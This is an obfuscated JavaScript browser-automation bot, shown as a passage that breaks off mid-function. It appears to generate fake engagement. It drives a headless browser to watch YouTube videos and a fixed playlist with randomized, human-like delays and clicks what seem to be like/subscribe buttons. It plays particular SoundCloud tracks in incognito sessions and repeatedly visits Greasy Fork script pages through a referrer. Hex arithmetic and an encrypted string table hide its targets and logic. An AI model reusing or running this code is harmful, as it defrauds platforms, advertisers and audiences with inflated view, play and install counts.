const X = b,
  W = c,
  V = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xeaa + 0x9d * -0xb + -0x7ea))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2 * 0xdbd + -0x11a9 + -0x9d1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x6 * 0xe6e + -0x96d4 * -0x1 + -0x3c1c * 0x2 + (-0x2b5 + -0x388a * -0x1 + -0x35 * -0x17) * random()) : await standardWaitForNetIdle(f), await wait(-0x1e82 + -0x2 * 0x487 + 0x3b18 + (0x3ebb * -0x1 + 0x557 * -0x6 + 0x85d5 * 0x1) * random()), -0x19 * 0xe9 + 0x23e2 + -0x8c * 0x18;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x30b + -0x7a * -0xb + 0x1155), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x59 * -0x17 + -0x730 + -0xce;
}
async function randomWait() {
  return await wait(0x445 * 0x7 + 0xa08 + -0x1463 * 0x1 + (0xa29 + 0xef6 + 0x1b * -0x35) * random()), -0x1381 + 0x3ab + 0xfd7;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2682 + -0x12f + -0x1 * 0x2553, -0x22bb + 0x25eb * -0x1 + 0x48ad), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', R(0xd));
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x3 * -0x234d + -0x5 * 0x127 + 0x15a0a) * getRandomInt(0x1ee9 + -0x1412 * -0x1 + -0x32f9 * 0x1, -0x5 * -0x5db + 0x1298 + 0x6d6 * -0x7), h)), -0x1 * 0x2629 + -0xd85 * 0x1 + 0x33af;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x17ef + -0x2c * -0x2a + -0x1f27;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x20d * 0xd + 0x2 * 0x583 + -0x25ae]['split']('\x20');
    for (let k = -0x19 * 0xaf + -0x166b + 0x1 * 0x2782; k < i['length']; k += -0x1143 + -0x2bb + 0x1400)
      j += i[k] * h[i[k + (-0x89 * -0xb + -0x1 * 0x1703 + -0x5 * -0x36d)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xdba + -0x127 + -0xc8d)['map'](l => Array['from'](l['children']))['flat'](0x1d00 + 0x12d6 + -0x991 * 0x5)['map'](l => l['childNodes'][0x1da4 + -0xe * -0x1a3 + -0x348d]['childNodes'][0x2 * 0x3df + 0x1 * 0xaae + -0x126c]['childNodes'][0xf0f + -0x3 * 0x254 + -0x812]['childNodes'][-0x95 * 0x1b + -0x1b00 + -0x1b * -0x195]['childNodes'][-0x189a + -0x9d4 + 0x226f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x4ba * 0x2 + 0x1aa0 + -0x4 * 0x351, 0x1573 * -0x1 + 0x5ff + 0x2 * 0x117e)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x134 * -0x15 + 0x5007 * 0x1 + 0x3d5);
  const h = await getMaxTime(f),
    i = Math['min']((-0x8341 + 0x40d8 + 0x6443 * 0x3) * getRandomInt(0x1ca2 * 0x1 + -0x6 * 0x621 + -0x95 * -0xe, 0x1 * 0x13a7 + 0x174f + -0x2af1), h);
  return await wait(i), -0x117f + -0x149d * 0x1 + 0x261d;
}

function a() {
  const bl = [
    'esome-and-',
    'kCkSW4C1E8kVW5W2WQhdUG',
    'tczfW5ddSCkCE8kcW6ZdRq',
    'k8oxWQ7dSSoy',
    'rg/en/scri',
    '-moomoo-io',
    'Ahr0Chm6lY9VCa',
    'hashed',
    'bZNcNCkfW4RcPCoXaCkgea',
    'nY93Cc5QCW',
    'e/*',
    'rg/scripts',
    'https://gr',
    'x19Zy29Wzq',
    'se-stop-in',
    'easyfork.o',
    'W4hdOCkEAZvLyxalpW',
    'X188Riipfm',
    'BwLUzwnYywz0ia',
    'W6hdS1zbxW',
    'HaI7BjnwnO',
    'ltHMy2vMzta2mq',
    'W6T0W6dcNCoje1RcQgm9',
    'going\x20to\x20f'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function frontScreenActions(f) {
  const S = d;
  return log(S(0x17) + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x653 * -0x2 + -0x22b + 0x1 * 0xed1]['children'][0x210 + -0x1d2d + -0x277 * -0xb]['children'][-0x1 * -0xacd + -0x17d * -0xe + -0x59 * 0x5b]['children'][-0xfe3 + 0xed + 0x1 * 0xef6]['children'][0x23e5 + -0x248c + 0xa7]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x109c + 0x1 * -0x166 + -0x1 * 0xf35;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x16 + 0x2 * -0xd4f + 0x1ab4);
    let h = e[f];
    if (b['bSvALp'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2395 + 0x2695 + -0x300, s, t, u = -0x7 * 0x286 + -0x1 * -0x2440 + -0x1296; t = n['charAt'](u++); ~t && (s = r % (0xeaa + 0x9d * -0xb + -0x7e7) ? s * (0x2 * 0xdbd + -0x11a9 + -0x991) + t : t, r++ % (0x2 * 0x737 + -0x1924 * -0x1 + -0x13c7 * 0x2)) ? p += String['fromCharCode'](-0xe7 + -0x12d9 * -0x1 + -0x10f3 * 0x1 & s >> (-(-0x1e82 + -0x2 * 0x487 + 0x2792) * r & 0xfaf * -0x2 + 0x557 * -0x3 + 0x2f69 * 0x1)) : -0x19 * 0xe9 + 0x23e2 + -0xd21 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x30b + -0x7a * -0xb + -0x233, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x59 * -0x17 + -0x730 + -0xbf))['slice'](-(0x445 * 0x7 + 0xa08 + -0x27e9 * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xa29 + 0xef6 + 0x3b * -0x6d,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1381 + 0x3ab + 0xfd6; u < 0x2682 + -0x12f + -0x1 * 0x2453; u++) {
          p[u] = u;
        }
        for (u = -0x22bb + 0x25eb * -0x1 + 0x48a6; u < 0x1 * -0x8d3 + -0x3 * 0x29 + 0xa4e; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1ee9 + -0x1412 * -0x1 + -0x9ff * 0x5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x5 * -0x5db + 0x1298 + 0x993 * -0x5, q = -0x1 * 0x2629 + -0xd85 * 0x1 + 0x33ae;
        for (let v = 0x17ef + -0x2c * -0x2a + -0x1f27; v < n['length']; v++) {
          u = (u + (0x20d * 0xd + 0x2 * 0x583 + -0x25ae)) % (-0x19 * 0xaf + -0x166b + 0x1 * 0x2882), q = (q + p[u]) % (-0x1143 + -0x2bb + 0x14fe), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x89 * -0xb + -0x1 * 0x1703 + -0x3a * -0x50)]);
        }
        return t;
      };
      b['nWGXjn'] = m, c = arguments, b['bSvALp'] = !![];
    }
    const j = e[0xdba + -0x127 + -0xc93],
      k = f + j,
      l = c[k];
    return !l ? (b['ubDqBl'] === undefined && (b['ubDqBl'] = !![]), h = b['nWGXjn'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x4 * -0x304 + 0xe * -0x7 + 0x5a5 * -0x2 + (0x248e + -0x3d * 0xa1 + 0x9 * 0x39) * random()
  }), await wait(-0x878 + 0x18b9 + -0xe4d + (-0x996 + 0x1984 + 0xec2 * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x5 * 0x6b + -0x1 * 0x1e7 + 0x400 * 0x1]['childNodes'][-0x35f + -0x17 * -0x45 + -0x2d3 * 0x1]['childNodes'][0x1e42 + -0xcf4 * 0x3 + -0x1 * -0x89b]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x52e + -0x1 * -0x32e + -0x1 * -0x205]['childNodes'][-0x14ab * 0x1 + -0x1709 + 0x2bb4]['childNodes'][-0x5 * 0x5f3 + -0x137 + 0x1ef8]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1 * 0x1fbb + -0x82b * -0x1 + 0x27e5 * -0x1),
          r = 0x1ce * 0x8 + -0x939 * -0x1 + -0x17a9;
        for (let u = -0x11e * -0x21 + 0xb38 * -0x2 + -0xe6e; u < q['length']; u += -0x1841 + -0xcdd + 0x948 * 0x4)
          r += q[u] * k[q[u + (-0x2 * 0x93b + 0x2383 + -0x110c)]];
        return r;
      }(n);
  });
  await wait((-0x2496 * 0x3 + -0x1 * -0x5beb + 0x4c6f * 0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x19569 + -0x7262 + 0x7 * 0x6bbd) * getRandomInt(-0xc54 + 0xf83 + -0xb * 0x4a, -0x1 * 0x1897 + 0x2 * 0x1bb + 0x1 * 0x152b), h + (-0x220 + 0x3 * -0x9c5 + 0x32f7));
  return await wait(i), 0xba0 + -0x10f + 0x1 * -0xa90;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1722 + -0x1 * -0x443 + -0x1b65), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * 0xae6 + -0x18d3 + 0x2f71 + (0x2588 * -0x1 + -0x1 * -0x5ad + 0x23c3) * Math['random']());
    });
  }, 0x7a9 * -0x7 + -0x1 * -0x35c9 + 0x1b2e);
  await wait(0x71033 * 0x1 + 0x1a8 * 0x40c + 0xb5d * -0xcf);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x17 * -0x869 + 0x3b * -0x3a9 + 0x100e4) * getRandomInt(0x1216 + -0x3 * 0x595 + 0x3 * -0x71, -0x1 * 0xbd4 + -0x21fe + 0x2deb)), clearInterval(h), -0x4c6 * 0x7 + 0x161a + 0xb51;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x16 + 0x2 * -0xd4f + 0x1ab4);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x3 * 0xa90 + 0x268 * -0xe + 0x4160;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x6c1 + -0x24f3 + 0x2bb5;
    await randomWait();
  }
  return 0x17db + 0x115 * -0x1 + -0x16c5;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1 * 0xab7 + -0x9af + -0x7 * -0x2ea + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x3 * 0x92e + -0xaf3 + -0xa7 * -0x3b + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x413 * -0x1 + 0x5c1 * -0x3 + 0x1556 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xda * 0xe + -0x16a3 + -0x228f * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x6a3 * -0x1d + 0x2632 + 0x14a0d + getRandomInt(-0xc5 * -0x66 + -0x2 * 0x389b + 0x5d50, 0x6c5d * 0x1 + 0xb7ef * 0x1 + -0x1c * 0x641));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x2511 + -0x17 * -0x2e + -0x1499 * 0x2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x149d + -0xd60 + -0x1 * -0x21fd;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xb3c + 0x1 * -0xded + 0x1929, -0x1e25 * -0x1 + 0x664 * 0x5 + 0x17 * -0x2b1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xb * 0x25f + 0x19c4 * -0x1 + 0x13 * 0x65 + floor((-0x713 * -0x5 + 0x2 * -0x3a2 + -0x1833) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x6b77d1e + -0x48a66b54 * 0x3 + 0x160aabf1a),
          0xce43ef + 0x3f0d * 0x2b6 + -0xf9312d,
          0x3431 * 0x3 + -0x48a * 0x1b + -0x1 * -0x5dfb,
          0x19e0 + -0xd * 0x2d7 + 0x5 * 0x24f
        ], y = [
          0x978 + 0x1273 * 0x1 + -0x1bd3,
          0x25e7 * -0x1 + 0xe50 + 0x4bb * 0x5,
          -0x16e2 + -0x1 * -0x98b + -0xa3 * -0x15,
          -0x143 + 0xcb2 + -0xb6f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1f * -0x101 + 0x64a + -0xbb * -0x22)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1c5 * -0x2 + -0x1 * -0x1168 + -0xdde; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1b9c + -0x809 + -0x5 * -0x721) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x181f * 0x1 + 0x13 * 0xc7 + -0x26e4] = A[-0x1b87 + 0x33 * -0xa7 + 0x1 * 0x3cdc] = A[-0x573 * 0x3 + 0x2f * -0xa0 + -0xf3e * -0x3] = A[-0x5 * 0x773 + 0x4f * -0x6a + 0x45f7] = A[-0xef * -0xc + -0x1067 + 0x536] = A[0x161 * 0x17 + 0x2 * 0x6a6 + -0x2cff * 0x1] = A[0x2539 + -0xf4d + -0x15e7] = A[-0x2591 * 0x1 + 0x1fc8 + 0x5cf] = A[0x25f2 + -0x10f4 + -0x14f7 * 0x1] = A[0x101 + 0x259d * -0x1 + -0x1252 * -0x2] = A[-0x2023 + -0xa81 + -0x19 * -0x1b5] = A[0x101 + 0x2af * 0xc + -0x212b] = A[-0x1 * 0x3cd + -0x142f * 0x1 + 0x1 * 0x1807] = A[-0x4 * -0x1e5 + 0xce6 + -0xa * 0x20b] = A[0xf37 + -0x91e * 0x4 + 0x154e] = A[0x7 * 0x50d + -0x3 * -0x2cd + 0x1 * -0x2bb4] = A[0x1 * -0x1bf + 0x1 * 0xee + -0x70 * -0x2] = 0xe75 + 0x20ab * 0x1 + -0x1d0 * 0x1a, this['blocks'] = A) : this['blocks'] = [
                0x185 * 0xa + 0x26ca + -0x35fc,
                -0x95f + 0x17bb + -0xe5c,
                0xd9 * 0x29 + 0x15 * -0x3d + -0x1dc * 0x10,
                -0x1bb4 + -0x140a + -0x2 * -0x17df,
                -0x2 * 0x2b7 + 0x5 * -0x7c7 + 0x2c51,
                -0x1 * 0x11b + -0x15a6 + 0xe9 * 0x19,
                -0x237c + 0x7db * 0x1 + 0x1ba1,
                0x81f + 0x11b3 * 0x1 + -0x52a * 0x5,
                0x11ff + -0x1874 + -0x227 * -0x3,
                0x7d * -0x2b + -0xbe * -0x1d + -0x2d * 0x3,
                0x1 * 0x26bf + 0x2 * -0xc67 + 0x2b * -0x53,
                0x21 * -0x86 + 0x638 * 0x1 + 0xb0e,
                0x4e8 + -0x35 * -0x6e + 0x93a * -0x3,
                -0x81 * -0x1 + 0x1dc5 + -0x1e46,
                -0x16c6 * 0x1 + 0xf62 + -0x2b * -0x2c,
                -0x1c21 + -0x32 * -0x76 + 0x515,
                0x5 * 0x2c9 + 0xb8d * -0x1 + -0x4 * 0x98
              ], this['h0'] = -0x57d2c9b8 + 0x2d214027 + 0x4e2c47 * 0x1de, this['h1'] = 0x1dce6469b + -0x36e3d9b * -0x8 + -0x1cc5e * 0x931b, this['h2'] = -0xc15e54e3 * 0x1 + -0x1 * 0x93512b4b + 0x1ed6a5d2c, this['h3'] = 0x7b72b27 * 0x2 + -0x1a8 * 0xc49bb + -0x2 * -0xa8f0df0, this['h4'] = -0x112cef1ff + -0x136703ea4 * -0x1 + -0xfaba3 * -0xa39, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x16db + -0x1a8d + -0x11 * -0x2e8, this['finalized'] = this['hashed'] = -0x2298 + -0x78a * 0x1 + 0x2a22, this['first'] = -0x1e56 + -0x2346 + 0x419d;
            }
            ['update'](J) {
              const U = b,
                T = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x857 + 0xc9b + -0x444, O = J['length'] || -0x134a + 0xc16 * 0x1 + 0x734, P = this['blocks']; M < O;) {
                  if (this[T(0x7)] && (this['hashed'] = -0x23e0 + 0xa15 + -0x899 * -0x3, P[0x1fd7 + 0x2 * 0xb65 + -0x36a1] = this['block'], P[0x6b * 0x2 + -0x10ff + 0x1039] = P[-0x2681 + 0x10f5 + 0x158d] = P[0x14b7 * 0x1 + -0x1b61 + -0x1 * -0x6ac] = P[-0x270e + 0x2237 + 0x4da] = P[-0x41e + -0x42c + 0x1 * 0x84e] = P[0x1 * 0x174b + 0x241 * -0x11 + -0xf0b * -0x1] = P[0x2253 + -0x15e + -0x20ef] = P[-0x1c11 + 0x13b1 + 0x867] = P[0x15ec + -0x1ee5 * -0x1 + -0x34c9] = P[-0x2 * 0x10b0 + -0xfb6 + -0x1 * -0x311f] = P[0x8 * 0x52 + -0x14 * 0x100 + -0x8bd * -0x2] = P[0x3 * 0x384 + 0xf16 + -0x1 * 0x1997] = P[-0x185e + 0x14c7 + 0x3a3] = P[0x1afc + 0x1 * -0xccb + -0xe24] = P[0x1e9d + -0x10a2 + 0xded * -0x1] = P[0x1 * -0x15a1 + -0x2 * 0xca7 + 0x2efe] = 0xc0f + 0xe5e + 0x5 * -0x549), K) {
                    for (N = this['start']; M < O && N < -0x77 * 0x24 + -0xddf + 0x3 * 0xa49; ++M)
                      P[N >> -0x7bd * -0x2 + -0xdf + -0x25 * 0x65] |= J[M] << y[0x293 * -0x5 + -0x1e4a * -0x1 + 0x45a * -0x4 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x25c6 + -0x1f3d + -0x649 * 0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x1244 + -0x12c9 + 0x105 ? P[N >> -0x204b + 0x18ac + 0x7a1] |= L << y[-0x251f + 0x1 * -0x1bf + -0x25 * -0x10d & N++] : L < 0x1f * -0x79 + -0x111b + 0x27c2 ? (P[N >> -0x944 * 0x4 + 0x4bd * 0x1 + -0x1f * -0x10b] |= (0x2 * 0xf4c + -0x1 * 0x2457 + 0x67f | L >> 0x1dd8 + 0x23d6 + -0x41a8) << y[0x26a4 + -0xe * 0x215 + 0x1 * -0x97b & N++], P[N >> 0xe4 + -0x1838 + 0x2 * 0xbab] |= (0x14c8 + 0xb98 + -0x1fe0 | 0x33 * -0x75 + -0x1af6 + 0x3284 & L) << y[0xd57 + -0x24b8 + -0x1f3 * -0xc & N++]) : L < 0x1835f + -0x5c07 + -0x4f58 || L >= 0xa * -0x1b0a + -0x1643 * 0x9 + 0x2b6bf ? (P[N >> 0x12c0 + -0x2336 * 0x1 + 0x1078] |= (-0x1cac + 0xa45 + 0x1347 * 0x1 | L >> -0x6be + -0x23f9 + -0x59 * -0x7b) << y[0x1 * -0x2029 + -0x11a * -0xf + 0x1 * 0xfa6 & N++], P[N >> -0x49e + -0x3 * -0x724 + -0x10cc] |= (-0xc * 0x11b + -0x25b1 * 0x1 + 0x3375 | L >> 0xb45 + 0x1481 * 0x1 + -0x1fc0 & 0x2683 + -0x4 * -0x2fa + 0x34 * -0xf7) << y[-0x2078 + 0xac * 0x39 + 0x5d1 * -0x1 & N++], P[N >> -0xe12 + 0x51 * 0x19 + 0x62b] |= (-0x19c7 * -0x1 + -0x2047 * -0x1 + -0x398e | 0x1495 + -0xbce * 0x1 + -0x888 & L) << y[-0x1049 * -0x1 + 0x1682 + -0x8 * 0x4d9 & N++]) : (L = 0x18672 + 0x7f63 * -0x2 + 0x2 * 0x3c2a + ((-0x1 * 0x895 + -0xb48 + 0x6 * 0x3fa & L) << -0x1bdc + -0x1d02 + 0x38e8 | -0x1a8a + 0x17b + 0x1d0e & J['charCodeAt'](++M)), P[N >> -0x37 * 0x67 + 0x3e * -0xa + 0x1 * 0x188f] |= (-0x229d + -0x2027 + 0x43b4 | L >> -0x3a * -0x7b + -0x1bc6 + -0x2 * 0x3) << y[0x7ef + 0x805 * 0x4 + -0x100 * 0x28 & N++], P[N >> 0x74 * -0x4a + -0x42f + 0x25b9] |= (-0x17a5 + 0x1f73 * -0x1 + 0x3798 | L >> -0x1c2b + 0x199f + -0x1 * -0x298 & 0x7d2 + -0x91c + 0x189) << y[0x1 * 0x214b + 0x1 * 0x9a7 + -0x2aef & N++], P[N >> 0xcf3 + -0x1144 + 0x453] |= (-0x1ff3 * 0x1 + 0x113d + 0xf36 | L >> -0x963 + 0x2 * 0x817 + -0x6c5 & -0x7ed + -0x1071 + 0x189d * 0x1) << y[0x24 * 0xa4 + -0xcaa + -0xa63 & N++], P[N >> 0x1 * 0x163 + 0xff8 + 0x1 * -0x1159] |= (0x2 * 0x12b9 + 0x1b2d * -0x1 + -0x1 * 0x9c5 | -0x202b + 0x2 * -0x2de + 0x13 * 0x202 & L) << y[0x1223 * -0x1 + -0x260a + 0x706 * 0x8 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this[U(0x13, 'b17(')] += N - this['start'], N >= -0x25db + 0x8d2 + -0x33 * -0x93 ? (this['block'] = P[-0xe * 0xe3 + 0x6a6 + -0x1 * -0x5d4], this['start'] = N - (-0x818 + -0x67 * -0x41 + -0x11cf), this['hash'](), this['hashed'] = -0x1 * 0x1f61 + -0xbb8 + 0x72f * 0x6) : this['start'] = N;
                }
